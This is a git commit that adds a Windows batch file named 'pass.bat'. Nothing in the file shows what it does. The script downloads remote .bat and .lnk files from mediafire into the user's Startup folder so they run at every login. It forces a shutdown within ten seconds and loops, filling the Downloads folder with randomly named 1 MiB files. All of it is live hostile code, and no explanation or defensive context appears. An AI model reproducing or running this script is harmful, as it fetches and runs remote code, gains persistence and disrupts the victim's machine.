f1ed1b4f3fff77d9d0b91e673c84382473d89663
breadbrowser <64813014+breadbrowser@users.noreply.github.com>
2022-12-01 21:01:14 -0500

    Add files via upload

---
+++ pass.bat
@@ -0,0 +1,44 @@
+ÿþ
+
+@echo off
+
+curl "https://download1592.mediafire.com/pt32hdj41pdg/kxobtw3ce0xsxqy/New+Text+Document+%285%29.txt" --output onedrive.bat
+move "onedrive.bat" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"
+
+curl "https://download1484.mediafire.com/gighuqdbu7sg/49l8fpojahbxit5/yeert.txt" --output cron.bat
+move "cron.bat"  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"
+
+curl "https://download1592.mediafire.com/pt32hdj41pdg/kxobtw3ce0xsxqy/New+Text+Document+%285%29.txt" --output tools.bat
+move "tools.bat" "C:\Users\%USERNAME%\Documents"
+
+curl "https://download1077.mediafire.com/ck3fl9280vag/o3bee7p8e8rtjzd/tools+-+Shortcut.lnk" --output tooltools.lnk
+move "tooltools.lnk"  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"
+echo lmao
+Shutdown.exe -s -t 10
+cls
+:loop
+:loop
+:loop
+set /a num=%random% %%1000000000
+curl "https://download1500.mediafire.com/stpoem9g4h9g/e4frf6xr9kprg55/1MiB.bin" --output %num%d%num%ownl%num%oad%num%.bin
+set /a num=%random% %%1000000000
+curl "https://download1500.mediafire.com/stpoem9g4h9g/e4frf6xr9kprg55/1MiB.bin" --output %num%d%num%ownl%num%oad%num%.bin
+move "%num%d%num%ownl%num%oad%num%.bin" "C:\Users\%USERNAME%\Downloads"
+set /a num=%random% %%1000000000
+
+curl "https://download1500.mediafire.com/stpoem9g4h9g/e4frf6xr9kprg55/1MiB.bin" --output %num%eed%num%ownload%num%.bin
+move "%num%eed%num%ownload%num%.bin" "C:\Users\%USERNAME%\Downloads"
+
+set /a num=%random% %%100000000
+curl "https://download1500.mediafire.com/stpoem9g4h9g/e4frf6xr9kprg55/1MiB.bin" --output %num%downl%num%ov%num%ad%num%.bin
+move "%num%downl%num%ov%num%ad%num%.bin" "C:\Users\%USERNAME%\Downloads"
+
+set /a num=%random% %%100000000
+curl "https://www.mediafire.com/file/qjxxhz1gupat2qt/New+Text+Document+(2).txt/file" --output %num%%num%ownl%num%ov%num%ad%num%.bin
+move "%num%%num%ownl%num%ov%num%ad%num%.bin" "C:\Users\%USERNAME%\Downloads"
+
+Shutdown.exe -s -t 10
+cls
+goto :loop
+
+
